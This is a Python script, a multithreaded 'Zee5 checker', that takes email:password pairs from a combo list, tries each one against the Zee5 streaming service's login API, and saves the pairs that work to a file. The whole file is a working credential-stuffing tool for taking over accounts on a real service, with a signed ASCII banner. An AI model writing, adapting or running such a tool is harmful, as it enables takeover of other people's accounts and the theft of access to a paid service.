import requests
import sys
import os
import threading 
from concurrent.futures import ThreadPoolExecutor, as_completed #// Threading
processes = [] # list for executing threads
threads = 5 # def value for threads

class Zee5Checker():
	def __init__(self):
		self.success = []
		self.invalid = []
		self.successC = 0
		self.invalidC = 0
		self.progress = 0
		self.CheckerStatus = 0
		self.successFile,self.invalidFile = None,None

	def login(self,email,password):
		params = {"email":email,"password":password}
		r = requests.post('https://userapi.zee5.com/v2/user/loginemail',json=params)
		if not (r.status_code==400 or r.status_code==401):
			threading.Thread(target=self.logChecker,args=(email,password,True,)).start()
		else:
			threading.Thread(target=self.logChecker,args=(email,password,False,)).start()
		
	def logChecker(self,email,password,working):
		self.progress += 1
		if working:
			self.success.append([email,password])
			self.successC += 1
			self.appendToFile(email,password,working)
		else:
			self.invalid.append([email,password])
			self.invalidC += 1
			self.appendToFile(email,password,working)
		self.CheckerStatus = 1
		

	def createFile(self):
		open("sucess.txt","w").close()
		open("invalid.txt","w").close()

	def appendToFile(self,email,password,working):
		if self.CheckerStatus == 0:
			self.createFile()
			self.successFile = open("sucess.txt","a")
			self.invalidFile = open("invalid.txt","a")
		if working:
			self.successFile.write("combo : "+email+":"+password+"\nEmail : "+email+"\nPassword : "+password+"\nType : Success\n"+"-"*10+'\n' )
		else:
			self.invalidFile.write("combo : "+email+":"+password+"\nEmail : "+email+"\nPassword : "+password+"\nType : Invalid\n"+"-"*10+'\n' )
	
	def printLog(self):
		os.system('cls')
		sys.stdout.write('''
		  ____        ___    ___ _           _           
		 |_  /___ ___| __|  / __| |_  ___ __| |_____ _ _ 
		  / // -_) -_)__ \ | (__| ' \/ -_) _| / / -_) '_|
		 /___\___\___|___/  \___|_||_\___\__|_\_\___|_|  
		                                              
     	 		- By Abhay (GITHUB:github.com/abhaygupta08)


	   	             RunningStatus : '''+str(self.CheckerStatus)+'''\n   		Progress : '''+str(self.progress)+'''\tValid : '''+str(self.successC)+'''\tInvalid : '''+str(self.invalidC)+'''\n''')
		sys.stdout.flush()
		print('\n\n')
		for e,p in self.success:
			print(e+':'+p)

app = Zee5Checker()
os.system('cls')
sys.stdout.write('''\r
		  ____        ___    ___ _           _           
		 |_  /___ ___| __|  / __| |_  ___ __| |_____ _ _ 
		  / // -_) -_)__ \ | (__| ' \/ -_) _| / / -_) '_|
		 /___\___\___|___/  \___|_||_\___\__|_\_\___|_|  
		                                              
     	 		- By Abhay (GITHUB:github.com/abhaygupta08)



   			Starting Your Application.../''' )
		
threads = int(input("\r\nEnter the number of Threads(Default-5): "))

with open("combo.txt","r") as abhay:
	combo = abhay.readlines()

def chking(email,password):
	app.login(email,password)
	app.printLog()

with ThreadPoolExecutor(max_workers=threads) as executor:
	for combos in combo:
		combos = combos.strip()
		comb=combos.split(":")
		processes.append(executor.submit(chking, comb[0],comb[1]))        